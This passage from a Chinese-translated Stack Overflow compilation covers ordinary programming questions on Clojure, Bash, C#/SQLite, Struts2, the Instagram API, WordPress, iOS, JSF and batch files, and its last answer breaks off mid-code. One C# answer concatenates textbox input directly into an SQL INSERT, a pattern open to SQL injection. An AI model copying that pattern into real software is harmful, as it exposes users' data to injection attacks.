(defn push [v i n] (if (>= (count v) n) (conj (subvec v 1 n) i) (conj v i) ) ) 
```

然后可以通过 rseq 访问得到的向量，我认为这对向量来说很快（由于它使用了索引偏移量？）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T23:48:11.420

[在https://github.com/amalloy/ring-buffer](https://github.com/amalloy/ring-buffer)查看 Amalloy 的环形缓冲区

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T04:14:32.467

IMO 你可以只使用一个列表：

```
(defn create-queue [len]
  (atom (repeat len nil)))

(defn push [queue new-items]
  (let [len (count @queue)
        len2 (count new-items)]
    (if (>= len2 len)
      (let [res (concat (take-last (- len2 len) new-items)
                        @queue)]
        (reset! queue (take len new-items))
        res)
      (let [res (take-last len2 @queue)]
        (reset! queue (concat new-items
                              (drop-last len2 @queue)))
        res)))) 
```

测试：

```
(def q (create-queue 4))

(take 4 @q)
-> (nil nil nil nil)
(push q [1 2 3])
-> (nil nil nil)
(take 4 @q)
-> (1 2 3 nil)
(push q [4 5])
-> (3 nil)
(take 4 @q)
-> (4 5 1 2)
(push q [6 7 8 9])
-> (4 5 1 2)
(take 4 @q)
-> (6 7 8 9)
(push q [10 11 12 13 15 16])
-> (15 16 6 7 8 9)
(take 4 @q)
-> (10 11 12 13) 
```

# apache - preload[ ] 的 server.conf json 条目

> ID：13353464
> 
> 赞同：1
> 
> 时间：2012-11-12T23:41:29.960
> 
> 标签：apache, r, opencpu

我想在opencpu中预加载一些包。我尝试了文件 /etc/opencpu/server.conf 中 preload[ ] 的一些变体，但它不起作用。想知道进入“preload []”数组字段的正确语法是什么？任何例子都会有所帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T03:47:36.093

它应该是包名称的向量，例如：

```
"preload": ["ggplot2", "MASS", "lme4"] 
```

请注意，未附加预加载的软件包。因此，它们出现在 sessionInfo() 中，但不在 search() 中。这是为了防止副作用或掩蔽冲突。

一旦一个包被预加载，附加它应该几乎是即时的。

# jquery - JQuery UI 滑块范围

> ID：13353470
> 
> 赞同：0
> 
> 时间：2012-11-12T23:42:36.257
> 
> 标签：jquery, user-interface, sliders

我正在使用具有非线性值的 JQuery 滑块小部件。基本上，我的滑块设置是这样的

```
function configSlider(p_propertyName, p_sliderSteps) {

var slider_values = p_sliderSteps.split(',');

//build slider
var slider_selector = "#slider_" + p_propertyName;

var slider = $(slider_selector).slider({
    value: 0,
    min: 0,
    max: slider_values.length,
change: function (event, ui) {
        calculateSomething(
            $('#slider1').slider_values[$('#slider1').slider('value')],
            $('#slider2').slider_values[$('#slider2').slider('value')], 
            $('#slider3').slider_values[$('#slider3').slider('value')]);
    },
} 
```

var slider_values 具有滑块的实际值。我需要将另外两个滑块的值也传递到上面的 calculateSomething 中。我知道为什么这行不通，但有没有类似于我的解决方案？

无论如何要在滑块对象中创建一个新 var 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:54:49.593

是的，您可以使用[jQuery`data()`](http://api.jquery.com/data/)将任意数据分配给元素：

```
$("#slider1").data("slider_values", slider_values); 
```

然后，检索它：

```
var slider1Values = $("#slider1").data("slider_values"); 
```

# bash - 有没有更一致的方式来声明 Bash 变量和函数？

> ID：13353474
> 
> 赞同：5
> 
> 时间：2012-11-12T23:42:49.920
> 
> 标签：bash, shell

我一直在为如何在 Bash 中声明变量或函数的决定而斗争。

鉴于以下假设：

1.  Bash 是唯一可用的脚本语言。
2.  命名约定无关紧要。

在*全局*变量的情况下，我应该使用：

1.  `foo=bar`- 功能的内部和外部？
2.  `declare -g foo=bar`- 功能的内部和外部？
3.  `local -g foo=bar`- 函数内部？

在*局部*变量的情况下，我应该使用：

1.  `local foo=bar`
2.  `declare foo=bar`

在*只读*变量的情况下，我应该使用：

1.  `declare -r foo=bar`
2.  `local -r foo=bar`
3.  `readonly foo`- 在 [1.] 或 [2.]`-r`之后，下一行没有标志。

在函数的情况下，我应该使用：

1.  `foo() { echo bar; }`
2.  `foo { echo bar; }`
3.  `function foo() { echo bar; }`
4.  `function foo { echo bar; }`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:42:49.920

为了忘记它，我在我`.bashrc`的每个 Bash shell 脚本文件的顶部附近定义了以下内容：

```
# Allow to define an alias.
#
shopt -s expand_aliases

# Defines a function given a name, empty parentheses and a block of commands enclosed in braces.
#
# @param name the name of the function.
# @param parentheses the empty parentheses. (optional)
# @param commands the block of commands enclosed in braces.
# @return 0 on success, n != 0 on failure.
#
alias def=function

# Defines a value, i.e. read-only variable, given options, a name and an assignment of the form =value.
#
# Viable options:
#   * -i - defines an integer value.
#   * -a - defines an array value with integers as keys.
#   * -A - defines an array value with strings as keys.
#
# @param options the options. (optional)
# @param name the name of the value.
# @param assignment the equals sign followed by the value.
# @return 0 on success, n != 0 on failure.
#
alias val="declare -r"

# Defines a variable given options, a name and an assignment of the form =value.
#
# Viable options:
#   * -i - defines an integer variable.
#   * -a - defines an array variable with integers as keys.
#   * -A - defines an array variable with strings as keys.
#
# @param options the options. (optional)
# @param name the name of the variable.
# @param assignment the equals sign followed by the value. (optional)
# @return 0 on success, n != 0 on failure.
#
alias var=declare

# Declares a function as final, i.e. read-only, given a name.
#
# @param name the name of the function.
# @return 0 on success, n != 0 on failure.
#
alias final="readonly -f" 
```

上面的定义让我可以说例如：

1.  `def foo { echo bar; }`.
2.  `final foo`
3.  `var foo=bar`
4.  `val foo=bar`

如注释所示，您可以混合和匹配各种变量标志，例如`var -g foo=bar`全局（-g）变量（var）或`val -Ai foobar=([foo]=0 [bar]=1)`只读（val），由整数（-i）值组成的关联数组（-A） .

这种方法也带有隐式变量范围。此外，任何使用 JavaScript、Java、Scala 等语言编程的软件工程师都应该熟悉新引入的关键字`def`、和。`val``var``final`

# c# - 使用外部 ramin.sql 文件使用 c# 创建 sqlite 数据库

> ID：13353476
> 
> 赞同：1
> 
> 时间：2012-11-12T23:43:08.357
> 
> 标签：c#, sql, sqlite

使用我的代码，我可以创建一个 sqlite 数据库文件。

```
public static void sqlite(string sqlite_file)
    {
        SQLiteConnection.CreateFile(sqlite_file);
        string str = "CREATE TABLE IF NOT EXISTS `aliases` (`key` varchar(255) NOT NULL,`value` varchar(255) NOT NULL);.... "          
        SQLiteConnection connection = new SQLiteConnection {
            ConnectionString = "Data Source=" + sqlite_file
        };
        connection.Open();
        SQLiteCommand command = new SQLiteCommand(connection) {
            CommandText = str
        };
        command.ExecuteNonQuery();
        command.Dispose();
        connection.Close();
        connection.Dispose();
    } 
```

所以我的问题：我想创建一个从外部 sql 文件（如 c://mysql/ramin.sql）读取数据的数据库，我必须在我的代码中做些什么更改？！

ramin.sql 文件上的数据格式为：

```
CREATE TABLE IF NOT EXISTS `aliases` (`key` varchar(255) NOT NULL,`value` varchar(255) NOT NULL);
CREATE TABLE IF NOT EXISTS `badnames` (`badname` varchar(255) NOT NULL);
CREATE TABLE IF NOT EXISTS `badwords` (`badword` varchar(255) NOT NULL);
and evey command in every line... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T07:58:38.853

将 .sql 文件作为文本文件打开，读取每一行，然后将其插入`SQLiteCommand`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T08:11:25.230

`CommmandText`您可以在使用中设置所有 sql 文本`System.IO.File.ReadAllText`

```
SQLiteCommand command = new SQLiteCommand(connection);  
command.CommandText = System.IO.File.ReadAllText(@"file.sql"); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-10-11T09:28:40.787

```
privat string _dataSource = @"H:\Ik.db";
private SQLiteConnection _connection;
private SQLiteCommand _command;

private void connectToSQLite()
{
    using (SQLiteConnection _connection = new SQLiteConnection())
    {
        if (File.Exists(@"H:\Ik.db"))
        {
            _connection.ConnectionString = $"Data Source={_dataSource};Version=3";
            _connection.Open();
            using (SQLiteCommand _command = new SQLiteCommand())
            {
                _command.Connection = _connection;
                   _command.CommandText = "INSERT INTO Customer(id, Lastname,firstname,Code,City) " +
                    $"VALUES(NULL, '{txt_Lastname.Text}', '{txt_name.Text}', '{ txt_code.Text}', '{ txt_city.Text}')";
                try
                {
                    _command.ExecuteNonQuery();
                    MessageBox.Show($"You Connected to local Data Base under {_dataSource} Sucssefuly");
                }
                catch (Exception)
                {

                    throw;
                }
            }
        }
        else
        {
            SQLiteConnection.CreateFile(@"H:\Ik.db");

        }
    }
} 
```

# tomcat - 没有为命名空间 [/] 映射的操作和与上下文路径 [] 关联的操作名称 [CheckLogin]

> ID：13353482
> 
> 赞同：2
> 
> 时间：2012-11-12T23:43:56.810
> 
> 标签：tomcat, ant, struts2, action-mapping

尝试使用 ant 部署我的应用程序时出现错误。当我从 intellij 运行应用程序时，它会正确部署和运行。但是，当我使用 ant 构建和部署时，出现错误：

```
There is no Action mapped for namespace [/] and action name [CheckLogin] associated with context path []. 
```

我已经包含了我的 ant build.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<project name="cars" default="all">
  <property file="build.properties"/>
  <property name="dist.dir" location="${basedir}/dist"/>
    <property name="tomcat.deploydir" location="/Users/bernardoneill/apache-tomcat-7.0.32/webapps"/>

    <target name="init" description="Build initialization"/>

    <target name="setup">
        <mkdir dir="dist" />
        <echo>Copying web into dist</echo>
        <copydir dest="dist/web" src="web" />
        <copydir dest="dist/web/WEB-INF/lib" src="${basedir}/web/WEB-INF" />
        <copydir dest="dist/web/WEB-INF/lib" src="${basedir}/lib" />

    </target>

    <target name="compile">
        <delete dir="${dist.dir}/web/WEB-INF/classes" />
        <mkdir dir="${dist.dir}/web/WEB-INF/classes" />
        <javac destdir="${dist.dir}/web/WEB-INF/classes" srcdir="${basedir}/src">
            <classpath>
                <fileset dir="${basedir}/web/WEB-INF">
                    <include name="*" />
                </fileset>
            </classpath>
            <classpath>
                <fileset dir="${basedir}/lib">
                    <include name="*" />
                </fileset>
            </classpath>
        </javac>
        <copy todir="${dist.dir}/web/WEB-INF">
            <fileset dir="src">
                <include name="**/*.properties" />
                <include name="**/*.xml" />
            </fileset>
        </copy>
    </target>

    <target name="buildwar">
        <war basedir="${basedir}/dist/web" destfile="ROOT.war"
             webxml="${basedir}/dist/web/WEB-INF/web.xml">
            <exclude name="WEB-INF/**" />
            <webinf dir="${basedir}/dist/web/WEB-INF/">
                <include name="**/*.jar" />
            </webinf>
        </war>
    </target>

    <target name="deploy">
        <copy file="ROOT.war" todir="${tomcat.deploydir}" />
    </target>

    <target name="all" depends="setup,compile,buildwar,deploy"></target>
</project> 
```

struts.xml

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd">

<struts>
    <package name="Cars" extends="struts-default" namespace="/">
        <action name="login">
            <result>/index.jsp</result>
        </action>
        <action name="CheckLogin" class="main.model.LoginResult">
            <result name="SUCCESS" type="chain">loadCars</result>
            <result name="ERROR">/index.jsp</result>
        </action>
        <action name="carList">
            <result>/HelloWorld.jsp</result>
        </action>
        <action name="manageUsers">
            <result>/ManageUsers.jsp</result>
        </action>
        <action name="loadCars" class="main.action.CarAction" method="execute">
            <result name="success" type="chain">selectCar</result>
        </action>
        <action name="selectCar">
            <result name="success">/selectCar.jsp</result>
        </action>
        <action name="hello" class="main.action.HelloWorldAction" method="execute">
            <result name="success">/HelloWorld.jsp</result>
        </action>
        <action name="add"
                class="main.action.UserAction" method="add">
            <result name="success" type="chain">manageUsers</result>
            <result name="input" type="chain">manageUsers</result>
        </action>
        <action name="delete"
                class="main.action.UserAction" method="delete">
            <result name="success" type="chain">manageUsers</result>
        </action>

        <action name="addCar"
                class="main.action.CarAction" method="add">
            <result name="success" type="chain">selectCar</result>
            <result name="input" type="chain">selectCar</result>
        </action>
        <action name="deleteCar"
                class="main.action.CarAction" method="delete">
            <result name="success" type="chain">selectCar</result>
        </action>
    </package>
</struts> 
```

另外，这是我的一些日志...

```
Nov 12, 2012 11:25:44 PM org.apache.catalina.startup.Catalina start
INFO: Server startup in 10215 ms
Nov 12, 2012 11:25:47 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: No configuration found for the specified action: 'CheckLogin' in namespace: ''. Form action defaulting to 'action' attribute's literal value.
Nov 12, 2012 11:25:48 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: No configuration found for the specified action: 'CheckLogin' in namespace: ''. Form action defaulting to 'action' attribute's literal value.
Nov 12, 2012 11:25:55 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: Could not find action or result
There is no Action mapped for namespace [/] and action name [CheckLogin] associated with context path []. - [unknown location]
    at com.opensymphony.xwork2.DefaultActionProxy.prepare(DefaultActionProxy.java:185)
    at org.apache.struts2.impl.StrutsActionProxy.prepare(StrutsActionProxy.java:63)
    at org.apache.struts2.impl.StrutsActionProxyFactory.createActionProxy(StrutsActionProxyFactory.java:39)
    at com.opensymphony.xwork2.DefaultActionProxyFactory.createActionProxy(DefaultActionProxyFactory.java:58)
    at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:501)
    at org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction(ExecuteOperations.java:77)
    at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:91)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680)
Nov 12, 2012 11:28:57 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: No configuration found for the specified action: 'CheckLogin' in namespace: ''. Form action defaulting to 'action' attribute's literal value.
Nov 12, 2012 11:28:58 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: No configuration found for the specified action: 'CheckLogin' in namespace: ''. Form action defaulting to 'action' attribute's literal value.
Nov 12, 2012 11:29:00 PM com.opensymphony.xwork2.util.logging.jdk.JdkLogger warn
WARNING: Could not find action or result
There is no Action mapped for namespace [/] and action name [CheckLogin] associated with context path []. - [unknown location]
    at com.opensymphony.xwork2.DefaultActionProxy.prepare(DefaultActionProxy.java:185)
    at org.apache.struts2.impl.StrutsActionProxy.prepare(StrutsActionProxy.java:63)
    at org.apache.struts2.impl.StrutsActionProxyFactory.createActionProxy(StrutsActionProxyFactory.java:39)
    at com.opensymphony.xwork2.DefaultActionProxyFactory.createActionProxy(DefaultActionProxyFactory.java:58)
    at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:501)
    at org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction(ExecuteOperations.java:77)
    at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:91)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T14:05:16.747

（进一步澄清 Mohana 的评论。）

参考`build.xml`文件的以下部分：

```
<target name="compile">
    ...
    <javac destdir="${dist.dir}/web/WEB-INF/classes" srcdir="${basedir}/src">
    ...
    <copy todir="${dist.dir}/web/WEB-INF">
        <fileset dir="src">
            <include name="**/*.properties" />
            <include name="**/*.xml" />
        </fileset>
    </copy>
</target> 
```

Struts 2 配置将在`WEB-INF`目录中结束，而 S2 期望它在类路径中。

# php - Instagram GET /users/user-id 没有返回任何数据？

> ID：13353484
> 
> 赞同：2
> 
> 时间：2012-11-12T23:44:02.477
> 
> 标签：php, api, json, instagram, endpoints

我试图在我的 php 页面中显示我的帐户的关注者数量，并且由于某种原因，当我尝试使用[https://api.instagram.com/v1/users/](https://api.instagram.com/v1/users/) {$userid}/follows?access_token= {$accessToken} fetchData 行，我没有得到任何信息。

```
<?php    

    $userinfo = fetchData("https://api.instagram.com/v1/users/{$userid}/follows?access_token={$accessToken}");
    $userinfo = json_decode($userinfo);

    foreach($userinfo->data as $profile) {
        $followers = $profile->counts->follow_by;
        echo "Followed by: ".$followers;
    }
?> 
```

但是，如果我将相同的代码与不同的端点命令一起使用并调用不同的数据，则效果很好（如下所示）

```
<?php    

    $userinfo = fetchData("https://api.instagram.com/v1/users/self/feed?access_token={$accessToken}");
    $userinfo = json_decode($userinfo);

    foreach($userinfo->data as $profile) {
        $followers = $profile->likes->count;
        echo "Followed by: ".$followers;
    }
?> 
```

知道我可能做错了什么吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T17:04:32.850

`users/{userid}/follows`端点不会返回您的个人资料中的任何数据。它只返回*您关注*的一组用户配置文件。

访问您的关注者数量的最快方法是使用`users/{userid}`端点：

```
$userinfo = fetchData("https://api.instagram.com/v1/users/YOUR_USER_ID?access_token=YOUR_ACCESS_TOKEN");
$userinfo = json_decode($userinfo);

$followers = $userinfo['data']['counts']['followed_by'];

echo "Folled by: " . $followers . " people"; 
```

此外，为了将来参考，我强烈建议您使用[Instagram 的 API Console](http://instagram.com/developer/api-console/)测试您的调用。这样您就可以查看每次调用返回的数据，以便您可以正确访问它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-16T04:30:00.073

我知道这是一个古老的问题，但它可能对其他人有所帮助。

```
$api_key = 'YOR_API_KEY';
$user_id = 'XXX';
$data = @file_get_contents("https://api.instagram.com/v1/users/$user_id/?client_id=$api_key");
$data = json_decode($data, true);
echo $data['data']['counts']['followed_by'];
//echo '<pre/>';
//print_r($data); 
```

这不需要访问令牌，它唯一需要的 API 密钥。如果您无法获取用户的用户 ID，但您知道他/她的姓名，只需转到该页面并简单地在浏览器中检查个人资料图像，您就会从那里找出用户 ID。

我希望它会帮助别人。

# php - 如何在 Wordpress 中编辑侧边栏的 HTML 输出？

> ID：13353492
> 
> 赞同：2
> 
> 时间：2012-11-12T23:45:04.980
> 
> 标签：php, html, wordpress

好的，所以我正在尝试更改 wordpress 侧边栏的 HTML 输出。

我尝试使用： register_sidebar(); 并在标题之后/之前和小部件之后/之前使用。

以上在某种程度上确实有效，但是 HTML 输出现在缺少小部件的主体的方式，我想编辑它并添加一个 div 包装小部件的主体。

现在它的。

```
 <div class="beforewidget">
      <div class="title">
      </div>

      // content of the widget
 </div> 
```

我想更改它，以便小部件的内容也将用 div 包装。

这是我的 register_sidebar()

```
 $args = array(
'name'          => __( 'Normal Sidebar', 'theme_text_domain' ),
'id'            => '3',
'description'   => 'Normal Sidebar',
    'class'         => '',
'before_widget' => '<div class="widget-body">',
'after_widget'  => '</div>',
'before_title'  => '<div class="widget-title">',
'after_title'   => '</div>' );
register_sidebar( $args ); 
```

我需要编辑哪个文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:52:31.620

```
 $args = array(
'name'          => __( 'Normal Sidebar', 'theme_text_domain' ),
'id'            => '3',
'description'   => 'Normal Sidebar',
'class'         => '',
'before_widget' => '</div><div class="widget-body">',
'after_widget'  => '</div>',
'before_title'  => '<div class="widget-title">',
'after_title'   => '' ); 
```

试试看

# xcode - 在 Xcode 4.5 中，为什么 Instruments 不再在符合条件的目标下显示我的应用程序？

> ID：13353499
> 
> 赞同：2
> 
> 时间：2012-11-12T23:45:34.217
> 
> 标签：xcode, xcode-instruments

这是发生的事情：

1.  我通过 USB 将我的 iPad 连接到我的 devbox。
2.  我启动了 Xcode 4.5，然后打开 Xcode>Open Developer Tool>Instruments。
3.  我在选择目标下选择了我的 iPad。
4.  然后我选择了一个模板——为了讨论，我们假设 Time Profiler。
5.  然后我从 All Processes>Choose Target... 中选择我的应用程序（已经在我的 iPad 上加载）作为目标。
6.  我记录了已检测的应用程序一段时间，然后停止记录。
7.  我退出了 Instruments。

接下来，我重新启动了我的 Mac。我重新启动了 Xcode 4.5 和 Instruments。我按照上述步骤来检测我的应用程序。但猜猜怎么了？在所有进程>选择目标...下找不到我的应用程序？

我用另一个应用程序尝试了这个，看看在我的第一个分析会话期间我的第一个应用程序是否发生了异常情况。第二个应用程序也发生了同样的事情！现在，这两个应用程序都不会出现在我在设置 Instruments 录音时可以定位的合格应用程序列表下。

问题：

# 1 没有一些简单的方法可以将仪器重置为原始状态吗？

# 2 发生了什么事？特别是，Instruments 在哪里存档其分析数据？

我还没有阅读 Instruments 文档，所以先道歉。如果有人能快速回答，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T20:03:42.700

发布的问题仍然存在。我可以通过在实时 iPad 上启动我的应用程序，然后通过选择将 Instruments 连接到我的应用程序来解决这个问题：所有进程>附加到进程>My.App

但是，如果我的应用程序尚未启动，则 Instruments 根本找不到对它的引用（按照上面列出的步骤之后）。

# ios - 点击一个 MKAnnotationView 以取消选择它并隐藏它的标注

> ID：13353505
> 
> 赞同：5
> 
> 时间：2012-11-12T23:45:58.830
> 
> 标签：ios, map, mkmapview, mkannotationview, callout

我有一个带有自定义注释的 iOS 应用程序。

1.  我希望能够点击一次 MKAnnotationView 以显示它的标注（工作正常）
2.  然后我想再次点击 MKAnnotationView 以取消选择注释并隐藏该注释的标注（适用于 iOS5 但不适用于 iOS6）。

我知道 didSelectAnnotationView 只应该在初始选择注释时调用。（[1]：[Selecting a MapView Annotation Twice](https://stackoverflow.com/questions/9874255/selecting-a-mapview-annotation-twice) ），并基于本文和我读过的其他文章（[2]：[ios mapkit 通过点击地图关闭注释标注](https://stackoverflow.com/questions/6449672/ios-mapkit-closing-annotation-callouts-by-tapping-the-map)），它看起来像检测到 MKAnnotationView 之后的任何额外点击它被选中需要一个 UITapGestureRecognizer。

所以，我正在使用 UITapGestureRecognizer 并且当我的注释视图已经被选中时，我可以正确地检测到额外的点击，当我识别出点击并且我正在隐藏/取消选择标注/注释时，我正在调用 deselectAnnotation分别。它在 iOS5 中运行良好，但在 iOS6 中只运行了一半

在 iOS6 中，点击手势识别器被调用，我调用我的代码来隐藏标注并取消选择注释，一切都很好，但随后 selectAnnotationView 方法被以某种方式调用，所以我的标注再次出现，我的注释再次被选中。

我假设正在发生的是，在我在我的点击手势识别器中取消选择注释视图后，点击事件仍然处于活动状态，mapView 检测到触摸事件并调用 selectAnnotationView，所以我*刚刚*的注释de-selected 现在再次被选中。

我不知道为什么它只发生在 iOS6 中，但我希望输入任何其他想法来处理我想要的行为。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-05T09:44:37.657

我不知道你是否还有问题（我希望不会，因为你的帖子有点旧了）。但是如果有些人遇到同样的问题，取消选择注释并避免 mapKit 重新选择它的一种解决方案是在取消选择注释之前添加一点延迟。

```
- (void)annotationTap:(UIGestureRecognizer *)gesture
{
    MKAnnotationView *mkav = (MKAnnotationView *)gesture.view;
    //Add a small delay to deselect
    [self performSelector:@selector(deselectAnnotation:)  withObject:mkav.annotation afterDelay:0.3];
    [gesture.view removeGestureRecognizer:gesture];
}

- (void)deselectAnnotation:(id<MKAnnotation>)annotation
{
    [self.mapView deselectAnnotation:annotation animated:YES];
} 
```

如果用户取消选择地图上的注释，请点击 donMt forge 以使用此代码删除手势

```
- (void) mapView:(MKMapView *)mapView didDeselectAnnotationView:(MKAnnotationView *)view {
         for (UIGestureRecognizer *recognizer in view.gestureRecognizers) {
             [view removeGestureRecognizer:recognizer];
         }
} 
```

# jsf - ManagedBean 不断返回相同的查询结果（会话/视图范围？）

> ID：13353510
> 
> 赞同：0
> 
> 时间：2012-11-12T23:46:46.493
> 
> 标签：jsf, jsf-2

我在 index.xhtml 页面中有以下内容。

```
<h:form id="findForm">
        <h:panelGrid columns="2" cellpadding="5">                
            <p:outputLabel value="Name" for="name"/>
            <p:inputText id="name" value="#{finder.name}"/>

            <f:facet name="footer">
                <p:commandButton value="Find"
                action="#{finder.gotoFoundPage}"/>
            </f:facet>
        </h:panelGrid>
</h:form> 
```

这是下一页的精简版 found.xhtml。

```
 <p:dataTable id="myTable" var="item" 
        value="#{finder.byName}" rowKey="#{item.name}" 
        paginator="true" rows="20" 
        selection="#{finder.selectedItem}" selectionMode="single">

        <p:column headerText="Name" sortBy="#{item.name}"
                filterBy="#{item.name}" id="name">
            #{item.name}
        </p:column>
    </p:dataTable> 
```

两个 xhtml 页面都使用相同的托管 bean。当我单击 index.xhtml 中的 CommandButton 时，它会导航到也使用 Finder bean（当前为 ViewScoped）的 found.xhtml 页面。问题是除非我将 Finder bean 设为 SessionScoped，否则 Finder bean 不会获得 #{finder.name}（用户在索引页面中输入并需要传递给找到的页面）。

因此，如果我将其设为 SessionScoped，那么问题在于，在手册页进行新搜索时，found.xhtml 页面会继续在找到的页面中显示相同的值。即使数据库中的值已更改，但值相同。我的理解是，如果我将其设为 ViewScoped，它会在每次页面加载时执行一个新查询，以更新显示的值。但不知道如何做到这一点。

```
@EJBs({@EJB(name="ejb/MyBean1", beanInterface=IMyBean1.class),
       @EJB(name="ejb/MyBean2", beanInterface=IMyBean2.class)})
@ManagedBean(name="finder")
@ViewScoped
public class Finder implements Serializable {

    // ...

    public String gotoFoundPage() {
        return "found?faces-redirect=true";
    } 
```

有人有想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T01:22:04.003

请记住，每当您使用该`?faces-redirect=true`技巧时，用户的浏览器都会使用 HTTP GET 请求进行重定向，这会导致 JSF 清除存储在视图中的任何状态。因此，即使您使用`@ViewScoped`bean，在重定向之后您也会获得一个全新的实例。

在您的情况下，因为它是一个简单的搜索，如果数据对出现在 URL 中不敏感，您可能希望使用视图参数来执行此操作。查看[BalusC 的这篇博文：JSF 2 中的通信，](http://balusc.blogspot.com.br/2011/09/communication-in-jsf-20.html)以了解有关此内容以及与在 JSF bean 和页面周围传递数据相关的其他内容的更多信息。

# batch-file - 比较文本文件中的值

> ID：13353511
> 
> 赞同：1
> 
> 时间：2012-11-12T23:46:47.980
> 
> 标签：batch-file, conditional-statements

您好，提前感谢您提供的任何帮助。

我有一个文本文件 (Check_Quantities.txt)，它将为我提供我需要采取行动的值。该文件将完全像这样读取：

`Qty1=200 Qty2=201`

（数字将全天变化）

我需要编写一个条件批处理文件来比较数字，然后阻止下一个动作发生，或者允许下一个动作发生。

例如，如果 Qty1 < Qty2，则停止进程，并在屏幕上显示警告消息。

如果 Qty1 >= Qty 2，则继续执行下一个操作，即...

`copy c:\temp\ASNReport.txt u:\temp`

我的编程知识真的很少，但这似乎是一项简单的任务。不幸的是，尽管搜索了几个小时，我还是无法在互联网上找到任何帮助。

再次感谢，巴特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T02:22:52.547

下面的命令将文件中给定的值加载到变量中：

```
for /F "tokens=1,2" %%a in (Check_Quantities.txt) do set %%a& set %%b 
```

上一行*等效*于执行以下命令（使用给定文件）：

```
set Qty1=200
set Qty2=201 
```

这样，您可以以任何您希望的方式使用变量的值。例如：

```
if %Qty1% geq %Qty2% (
   copy c:\temp\ASNReport.txt u:\temp
) else (
   echo Warning message
) 
```

当然，您至少需要了解 Batch 基础知识才能继续……

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T01:02:21.477

也许还有其他解决方案，但这应该可以完成工作。尝试这个：

```
@echo off
for /f  "tokens=2,4 delims==, " %%a in ( Check_Quantities.txt ) do (        
    if %%a LSS %%b (
